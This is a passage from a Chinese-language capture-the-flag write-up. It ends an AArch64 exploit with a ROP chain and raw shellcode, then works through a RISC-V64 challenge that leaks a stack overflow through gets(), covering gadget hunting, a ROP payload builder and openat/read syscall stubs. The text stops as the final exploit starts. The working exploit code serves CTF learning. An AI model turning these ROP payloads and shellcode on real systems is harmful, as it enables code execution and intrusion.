    <span class="mh">0x7a7a64ee995af919</span> <span class="p">:</span> <span class="mh">0xd5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7bf958971a5af919</span> <span class="p">:</span> <span class="mh">0xd6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7b784cbf9b5af919</span> <span class="p">:</span> <span class="mh">0xd7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7cf78120145af919</span> <span class="p">:</span> <span class="mh">0xd8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7c769508955af919</span> <span class="p">:</span> <span class="mh">0xd9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7df5a971165af919</span> <span class="p">:</span> <span class="mh">0xda000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7d74bd59975af919</span> <span class="p">:</span> <span class="mh">0xdb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7ef3d182105af919</span> <span class="p">:</span> <span class="mh">0xdc000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7e72c5aa915af919</span> <span class="p">:</span> <span class="mh">0xdd000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7ff1f9d3125af919</span> <span class="p">:</span> <span class="mh">0xde000000400ff8</span><span class="p">,</span>
    <span class="mh">0x7f70edfb935af919</span> <span class="p">:</span> <span class="mh">0xdf000000400ff8</span><span class="p">,</span>
    <span class="mh">0x60cce7fc2c5af919</span> <span class="p">:</span> <span class="mh">0xe0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x604df3d4ad5af919</span> <span class="p">:</span> <span class="mh">0xe1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x61cecfad2e5af919</span> <span class="p">:</span> <span class="mh">0xe2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x614fdb85af5af919</span> <span class="p">:</span> <span class="mh">0xe3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x62c8b75e285af919</span> <span class="p">:</span> <span class="mh">0xe4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6249a376a95af919</span> <span class="p">:</span> <span class="mh">0xe5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x63ca9f0f2a5af919</span> <span class="p">:</span> <span class="mh">0xe6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x634b8b27ab5af919</span> <span class="p">:</span> <span class="mh">0xe7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x64c446b8245af919</span> <span class="p">:</span> <span class="mh">0xe8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x64455290a55af919</span> <span class="p">:</span> <span class="mh">0xe9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x65c66ee9265af919</span> <span class="p">:</span> <span class="mh">0xea000000400ff8</span><span class="p">,</span>
    <span class="mh">0x65477ac1a75af919</span> <span class="p">:</span> <span class="mh">0xeb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x66c0161a205af919</span> <span class="p">:</span> <span class="mh">0xec000000400ff8</span><span class="p">,</span>
    <span class="mh">0x66410232a15af919</span> <span class="p">:</span> <span class="mh">0xed000000400ff8</span><span class="p">,</span>
    <span class="mh">0x67c23e4b225af919</span> <span class="p">:</span> <span class="mh">0xee000000400ff8</span><span class="p">,</span>
    <span class="mh">0x67432a63a35af919</span> <span class="p">:</span> <span class="mh">0xef000000400ff8</span><span class="p">,</span>
    <span class="mh">0x68dda5743c5af919</span> <span class="p">:</span> <span class="mh">0xf0000000400ff8</span><span class="p">,</span>
    <span class="mh">0x685cb15cbd5af919</span> <span class="p">:</span> <span class="mh">0xf1000000400ff8</span><span class="p">,</span>
    <span class="mh">0x69df8d253e5af919</span> <span class="p">:</span> <span class="mh">0xf2000000400ff8</span><span class="p">,</span>
    <span class="mh">0x695e990dbf5af919</span> <span class="p">:</span> <span class="mh">0xf3000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6ad9f5d6385af919</span> <span class="p">:</span> <span class="mh">0xf4000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6a58e1feb95af919</span> <span class="p">:</span> <span class="mh">0xf5000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6bdbdd873a5af919</span> <span class="p">:</span> <span class="mh">0xf6000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6b5ac9afbb5af919</span> <span class="p">:</span> <span class="mh">0xf7000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6cd50430345af919</span> <span class="p">:</span> <span class="mh">0xf8000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6c541018b55af919</span> <span class="p">:</span> <span class="mh">0xf9000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6dd72c61365af919</span> <span class="p">:</span> <span class="mh">0xfa000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6d563849b75af919</span> <span class="p">:</span> <span class="mh">0xfb000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6ed15492305af919</span> <span class="p">:</span> <span class="mh">0xfc000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6e5040bab15af919</span> <span class="p">:</span> <span class="mh">0xfd000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6fd37cc3325af919</span> <span class="p">:</span> <span class="mh">0xfe000000400ff8</span><span class="p">,</span>
    <span class="mh">0x6f5268ebb35af919</span> <span class="p">:</span> <span class="mh">0xff000000400ff8</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">fake_fp</span> <span class="o">=</span> <span class="mh">0x412500</span> <span class="c1"># .bss</span>
<span class="n">sc_addr</span> <span class="o">=</span> <span class="mh">0x412060</span> 
<span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x411FD8</span>
<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">success</span><span class="p">(</span><span class="s2">&#34;ret_addr : @&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">mapping</span><span class="p">[</span><span class="n">auth_addr</span><span class="p">]))</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">fake_fp</span><span class="p">,</span> <span class="n">mapping</span><span class="p">[</span><span class="n">auth_addr</span><span class="p">],</span>  <span class="c1"># fp0, ret_addr0</span>
            <span class="c1"># when in 0x400FF8, sp is here</span>
            <span class="n">fake_fp</span><span class="p">,</span> <span class="mh">0x400FD8</span><span class="p">,</span> <span class="c1"># X29, X30   </span>
            <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="c1"># X19, X20</span>
            <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># X21, X22-&gt;X0</span>
            <span class="n">sc_addr</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="c1"># X23-&gt;X1, X24-&gt;X2</span>
            <span class="n">fake_fp</span><span class="p">,</span> <span class="n">sc_addr</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
<span class="n">sc</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4</span><span class="s2">&#34;</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><h2 id="favourite-architecture-1">favourite architecture 1</h2>
<p>risc-v架构，64位，用Ghidra9.2反编译。符号表被扬了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">UndefinedFunction_00010400</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">ulonglong</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="n">longlong</span> <span class="n">lVar2</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">auStack488</span> <span class="p">[</span><span class="mi">192</span><span class="p">];</span>
  <span class="n">undefined</span> <span class="n">auStack296</span> <span class="p">[</span><span class="mi">256</span><span class="p">];</span>
  <span class="n">ulonglong</span> <span class="n">uStack40</span><span class="p">;</span>
  <span class="n">longlong</span> <span class="n">lStack32</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iStack20</span><span class="p">;</span>
  
  <span class="n">FUN_00017d74</span><span class="p">(</span><span class="n">PTR_DAT_0006ea28</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">FUN_00017d74</span><span class="p">(</span><span class="n">PTR_DAT_0006ea20</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">FUN_00017d74</span><span class="p">(</span><span class="n">PTR_DAT_0006ea18</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">FUN_0001605a</span><span class="p">(</span><span class="s">&#34;Input the flag: &#34;</span><span class="p">);</span>
  <span class="n">FUN_00016a5a</span><span class="p">(</span><span class="n">auStack296</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">FUN_000204e4</span><span class="p">(</span><span class="n">auStack296</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">uVar1</span> <span class="o">==</span> <span class="p">((</span><span class="n">longlong</span><span class="p">)(</span><span class="n">iRam000000000006e9dc</span> <span class="o">+</span> <span class="n">iRam000000000006e9d8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffU</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">lStack32</span> <span class="o">=</span> <span class="n">FUN_00020386</span><span class="p">(</span><span class="n">auStack296</span> <span class="o">+</span> <span class="p">((</span><span class="n">longlong</span><span class="p">)</span><span class="n">iRam000000000006e9d8</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">));</span>
    <span class="n">FUN_0001118a</span><span class="p">(</span><span class="n">auStack488</span><span class="p">,</span><span class="s">&#34;tzgkwukglbslrmfjsrwimtwyyrkejqzo&#34;</span><span class="p">,</span><span class="s">&#34;oaeqjfhclrqk&#34;</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
    <span class="n">FUN_000111ea</span><span class="p">(</span><span class="n">auStack488</span><span class="p">,</span><span class="n">auStack296</span><span class="p">,</span><span class="n">iRam000000000006e9d8</span><span class="p">);</span>
    <span class="n">lVar2</span> <span class="o">=</span> <span class="n">FUN_00020e2a</span><span class="p">(</span><span class="n">auStack296</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_0006d000</span><span class="p">,</span><span class="n">iRam000000000006e9d8</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uStack40</span> <span class="o">=</span> <span class="n">FUN_000204e4</span><span class="p">(</span><span class="n">lStack32</span><span class="p">);</span>
      <span class="n">iStack20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">uStack40</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="n">ulonglong</span><span class="p">)(</span><span class="n">longlong</span><span class="p">)</span><span class="n">iStack20</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">FUN_00016bc8</span><span class="p">(</span><span class="s">&#34;You are right :D&#34;</span><span class="p">);</span>
          <span class="n">gp</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x6f178</span><span class="p">;</span>
          <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">FUN_000102ae</span><span class="p">(</span><span class="n">iStack20</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">lStack32</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_0006d060</span><span class="p">);</span>
        <span class="n">lVar2</span> <span class="o">=</span> <span class="n">FUN_00020e2a</span><span class="p">(</span><span class="n">iStack20</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">lStack32</span><span class="p">,(</span><span class="n">longlong</span><span class="p">)(</span><span class="n">iStack20</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x6d030</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">lVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">iStack20</span> <span class="o">=</span> <span class="n">iStack20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">FUN_00016bc8</span><span class="p">(</span><span class="s">&#34;You are wrong ._.&#34;</span><span class="p">);</span>
  <span class="n">gp</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x6f178</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>


</code></pre></td></tr></table>
</div>
</div><p>用题目给的qemu跑一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ./qemu-riscv64 ./main 
Input the flag: <span class="m">1</span>
You are wrong ._.
$ 
</code></pre></td></tr></table>
</div>
</div><p>人工fuzz一下，出现段错误</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Input the flag: &#34;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span><span class="o">+</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>猜测读入的函数为gets()，没有检测读入长度。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span>gdb<span class="o">)</span> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6262626262626262 in ?? <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p>边调试边尝试恢复程序主要流程（逆向部分favourite architecture 0省略），是一个RISC-V64的栈溢出。auStack296在<code>s0-0x128</code>处，返回地址距离栈底0x120</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-CQL" data-lang="CQL"><span class="n">undefined8</span><span class="w"> </span><span class="n">UndefinedFunction_00010400</span><span class="p">(</span><span class="n">void</span><span class="p">)</span><span class="w">
</span><span class="w">
</span><span class="w"></span><span class="p">{</span><span class="w">
</span><span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">uVar1</span><span class="p">;</span><span class="w">
</span><span class="w">  </span><span class="n">longlong</span><span class="w"> </span><span class="n">lVar2</span><span class="p">;</span><span class="w">
</span><span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">auStack488</span><span class="w"> </span><span class="p">[</span><span class="mf">192</span><span class="p">];</span><span class="w">
</span><span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">auStack296</span><span class="w"> </span><span class="p">[</span><span class="mf">256</span><span class="p">];</span><span class="w">
</span><span class="w">  </span><span class="n">ulonglong</span><span class="w"> </span><span class="n">uStack40</span><span class="p">;</span><span class="w">
</span><span class="w">  </span><span class="n">longlong</span><span class="w"> </span><span class="n">lStack32</span><span class="p">;</span><span class="w">
</span><span class="w">  </span><span class="nb">int</span><span class="w"> </span><span class="n">iStack20</span><span class="p">;</span><span class="w">
</span><span class="w">  
</span><span class="w">  </span><span class="n">init_buf</span><span class="p">(</span><span class="n">PTR_DAT_0006ea28</span><span class="p">,</span><span class="mf">0</span><span class="p">);</span><span class="w">
</span><span class="w">  </span><span class="n">init_buf</span><span class="p">(</span><span class="n">PTR_DAT_0006ea20</span><span class="p">,</span><span class="mf">0</span><span class="p">);</span><span class="w">
</span><span class="w">  </span><span class="n">init_buf</span><span class="p">(</span><span class="n">PTR_DAT_0006ea18</span><span class="p">,</span><span class="mf">0</span><span class="p">);</span><span class="w">
</span><span class="w">  </span><span class="n">pRint</span><span class="p">(</span><span class="s">&#34;Input the flag: &#34;</span><span class="p">);</span><span class="w">
</span><span class="w">  </span><span class="n">gEts</span><span class="p">(</span><span class="n">auStack296</span><span class="p">);</span><span class="w">  </span><span class="c1">// stack_overflow
</span><span class="c1"></span><span class="w">  </span><span class="p">...</span><span class="w">
</span><span class="w">  
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></td></tr></table>
</div>
</div><p>下面我们来做RISC-V ROP，控制ra, a0-a2等寄存器便能任意执行函数。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png"
        data-srcset="https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png, https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png 1.5x, https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png 2x"
        data-sizes="auto"
        alt="https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png"
        title="https://i.loli.net/2021/01/27/DwxjP4bmFdK9e8r.png" /></p>
<p>在ghidra中查找包含<code>c.ldsp</code>指令的gadget以控制寄存器，只能直接找到控制saved regs的片段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">                             LAB_0001179e                                       
        0001179e e2  70           c.ldsp     ra,0x38 (sp)   # 栈上内容送reg
        000117a0 42  74           c.ldsp     s0,0x30 (sp)
        000117a2 a2  74           c.ldsp     s1,0x28 (sp)
        000117a4 02  79           c.ldsp     s2,0x20 (sp)
        000117a6 e2  69           c.ldsp     s3,0x18 (sp)
        000117a8 42  6a           c.ldsp     s4,0x10 (sp)
        000117aa a2  6a           c.ldsp     s5,0x8 (sp)
        000117ac 21  61           c.addi16   sp,0x40		# sp += 0x40 
        000117ae 82  80           ret						# jalr ra

</code></pre></td></tr></table>
</div>
</div><p>但我们知道一定会有把saved regs送往常用寄存器的gadget，实际上就在上面就有一条完整的利用链。由于没有got表，所以通过控制a5并利用0x0011796的跳转来实现任意地址执行。注意与x86不同的是，ret指令并不会改变sp位置。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">        00011772 93  07  84  b8    addi       a5,s0,-0x478	# a5 = s0 - 0x478
        00011776 13  09  09  b9    addi       s2,s2,-0x470
        0001177a 33  09  f9  40    sub        s2,s2,a5		# s2 -= 0x470 + a5
        0001177e 13  59  39  40    srai       s2,s2,0x3		# s2 &gt;&gt;= 3
        00011782 63  0e  09  00    beq        s2,zero ,LAB_0001179e # s2=0则跳转

                                     LAB_0001178c                                      
        0001178c 1c  60           c.ld       a5=&gt;-&gt;FUN_00010284 ,0x0 (s0=&gt;-&gt;FUN_00010250 )      
        0001178e 56  86           c.mv       a2,s5	# s5 -&gt; a2
        00011790 d2  85           c.mv       a1,s4	# s4 -&gt; a1
        00011792 4e  85           c.mv       a0,s3	# s3 -&gt; a0
        00011794 85  04           c.addi     s1,0x1
        00011796 82  97           c.jalr     a5=&gt;FUN_00010284	# 无条件跳转，并且把下一条指令写进ra（跳回继续执行）
        00011798 21  04           c.addi     s0,0x8
        0001179a e3  19  99  fe    bne        s2,s1,LAB_0001178c # s1≠s2则跳转
</code></pre></td></tr></table>
</div>
</div><p>整体思路为</p>
<ol>
<li>跳到0x1179e控制s0-s5与ra</li>
<li>ret到0x11772，使a5=target_fn, s2=0</li>
<li>跳转到0x1179e再次控制s0-s5与ra</li>
<li>ret到0x1178e控制a0-a2，执行target_fn，使s1=s2，让其继续执行到0x1179e</li>
<li>控制ra并重新回到main函数</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">ROP_ctrl</span><span class="p">(</span><span class="n">target_fn</span><span class="p">,</span> <span class="n">para1</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="n">para3</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x120</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="mh">0x1179e</span><span class="p">,</span> 
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x470</span><span class="p">,</span> <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="n">target_fn</span><span class="o">+</span><span class="mh">0x478</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x11772</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span>
                    <span class="n">para3</span><span class="p">,</span> <span class="n">para2</span><span class="p">,</span> <span class="c1"># s5, s4</span>
                    <span class="n">para1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>  <span class="c1"># s3, s2</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s1, s0</span>
                    <span class="mh">0x1178e</span><span class="p">,</span> <span class="c1"># ra</span>
                    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c1"># s0-s5</span>
                    <span class="n">main_addr</span><span class="p">,</span> <span class="c1"># ra</span>
                   <span class="p">)</span> 
    
    <span class="k">return</span> <span class="n">payload</span>
</code></pre></td></tr></table>
</div>
</div><p>至此我们便可以随心所欲地ROP了，最后需要找到orw的系统调用，RISC-V64用a7保存调用号。</p>
<p>openat：FUN_000221cc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000221cc () 
        000221cc 37  de  06  00    lui        t3,0x6d
        000221d0 83  3e  0e  ba    ld         t4,-0x460 (t3=&gt;DAT_0006cba0 )
        000221d4 5d  71           c.addi16   sp,-0x50
        000221d6 3e  fc           c.sdsp     a5,0x38 (sp)
        000221d8 06  ec           c.sdsp     ra,0x18 (sp)
        000221da 93  f7  05  04    andi       a5,a1,0x40
        000221de 32  f0           c.sdsp     a2,0x20 (sp)
        000221e0 36  f4           c.sdsp     a3,0x28 (sp)
        000221e2 3a  f8           c.sdsp     a4,0x30 (sp)
        000221e4 c2  e0           c.sdsp     a6,0x40 (sp)
        000221e6 c6  e4           c.sdsp     a7,0x48 (sp)
        000221e8 76  e4           c.sdsp     t4,0x8 (sp)
        000221ea 2e  83           c.mv       t1,a1
        000221ec aa  85           c.mv       a1,a0
        000221ee 8d  ef           c.bnez     a5,LAB_00022228
        000221f0 b7  07  41  00    lui        a5,0x410
        000221f4 b3  77  f3  00    and        a5,t1,a5
        000221f8 37  07  41  00    lui        a4,0x410
        000221fc 81  46           c.li       a3,0x0
        000221fe 63  85  e7  02    beq        a5,a4,LAB_00022228
        00022202 93  08  80  03    li         a7,0x38		# 调用号0x38为openat
        00022206 13  05  c0  f9    li         a0,-0x64
        0002220a 1a  86           c.mv       a2,t1
        0002220c 73  00  00  00    ecall					# syscall

</code></pre></td></tr></table>
</div>
</div><p>read：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000222ce ()    
        000222ce 93  08  f0  03    li         a7,0x3f
        000222d2 73  00  00  00    ecall

</code></pre></td></tr></table>
</div>
</div><p>exp如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
